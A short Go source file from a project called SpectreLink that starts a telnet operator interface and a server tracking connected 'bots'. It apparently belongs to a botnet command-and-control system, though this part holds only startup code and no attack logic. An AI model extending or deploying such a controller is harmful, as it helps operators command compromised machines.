package admin

import (
	"SpectreLink/bot"
	"SpectreLink/log"
	"SpectreLink/telnet"
	"sync"
)

type SpectreLink struct {
	bots   *sync.Map
	telnet *telnet.Server
	server *bot.Server
}

func (l *SpectreLink) ListenAndServe() {
	wg := new(sync.WaitGroup)
	wg.Add(2)

	go l.telnet.ListenAndServe(wg)
	go l.server.ListenAndServe(wg)

	log.Infof("Listening on %s", l.telnet.ListenAddr())

	wg.Wait()
}

func NewSpectreLink() *SpectreLink {
	return &SpectreLink{
		server: bot.NewServer(),
		telnet: telnet.NewTelnetServer(),
		bots:   new(sync.Map),
	}
}
